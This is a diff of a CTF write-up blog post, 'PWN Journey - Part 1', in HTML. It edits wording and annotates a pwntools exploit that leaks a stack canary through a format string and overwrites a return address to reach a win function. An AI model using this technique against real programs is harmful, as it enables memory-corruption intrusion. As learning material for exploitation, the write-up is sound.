@@ -50,7 +50,7 @@
 <meta name="twitter:creator" content="@The Archivist" />
 <meta name="google-site-verification" content="google_meta_tag_verification" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"PWN Journey - Part 1","dateModified":"2021-12-16T00:00:00+08:00","datePublished":"2021-12-08T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://legiahuyy.github.io/blog/en/posts/pwns-1/"},"url":"https://legiahuyy.github.io/blog/en/posts/pwns-1/","author":{"@type":"Person","name":"The Archivist"},"description":"Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"PWN Journey - Part 1","url":"https://legiahuyy.github.io/blog/en/posts/pwns-1/","dateModified":"2021-12-16T00:00:00+08:00","datePublished":"2021-12-08T00:00:00+08:00","author":{"@type":"Person","name":"The Archivist"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://legiahuyy.github.io/blog/en/posts/pwns-1/"},"description":"Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -2112,7 +2112,7 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="2710 words">
+  title="2721 words">
   <em>15 min</em> read</span>
 
 
@@ -2803,13 +2803,13 @@ Running at : nc pwnable.kr 9000
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-20.png" alt="" /></p>
 
-<p>So the buffer is 15 addresses (or 64 bytes) away from the canary, that is also the reason why <code class="language-plaintext highlighter-rouge">%15$p</code> is our input so that <code class="language-plaintext highlighter-rouge">puts</code> can print out the special sentinel value.</p>
+<p>So the buffer is 15 addresses (or 64 bytes) from the canary, that is also the reason why <code class="language-plaintext highlighter-rouge">%15$p</code> is our input so that <code class="language-plaintext highlighter-rouge">puts</code> can print out the special sentinel value.</p>
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-26.png" alt="" /></p>
 
 <p>And we successfully get the correct value of the canary.</p>
 
-<p>Nevertheless, keep in mind that stack canaries are randomized for every new process, therefore we have to automate the canary leaking procedure as below:</p>
+<p>Nevertheless, keep in mind that stack canaries are randomized for every new process, so we have to automate the canary leaking procedure as below:</p>
 
 <div class="language-python highlighter-rouge"><div class="code-header">
         <span label-text="Python"><i class="fas fa-code small"></i></span>
@@ -2845,7 +2845,7 @@ Running at : nc pwnable.kr 9000
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-33.png" alt="" /></p>
 
-<p>Stop at the second breakpoint we set earlier, I want you to remember that our current canary offset is at <code class="language-plaintext highlighter-rouge">0x7fffb74f25c0+16 = 0x7fffb74f25d0</code>.</p>
+<p>Stop at the second breakpoint we have set at the beginning, here I want you to remember that our current canary offset is at <code class="language-plaintext highlighter-rouge">0x7fffb74f25c0+16 = 0x7fffb74f25d0</code>.</p>
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-36.png" alt="" /></p>
 
@@ -2859,7 +2859,7 @@ Running at : nc pwnable.kr 9000
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-56.png" alt="" /></p>
 
-<p>or <code class="language-plaintext highlighter-rouge">iI~win</code> within radare2.</p>
+<p>or <code class="language-plaintext highlighter-rouge">afl~win</code> within radare2.</p>
 
 <p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-57.png" alt="" /></p>
 
@@ -2901,11 +2901,11 @@ Running at : nc pwnable.kr 9000
 <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Canary: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">72</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">8</span> 
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004011ec</span><span class="p">)</span>
-
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">72</span>	<span class="c1"># PAD_TIL_CANARY
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>					<span class="c1"># CANARY
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">8</span>	<span class="c1"># PAD_TIL_RIP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004011ec</span><span class="p">)</span>				<span class="c1"># WIN_OFFSET
+</span>
 <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Overflow me</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
 <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">())</span>
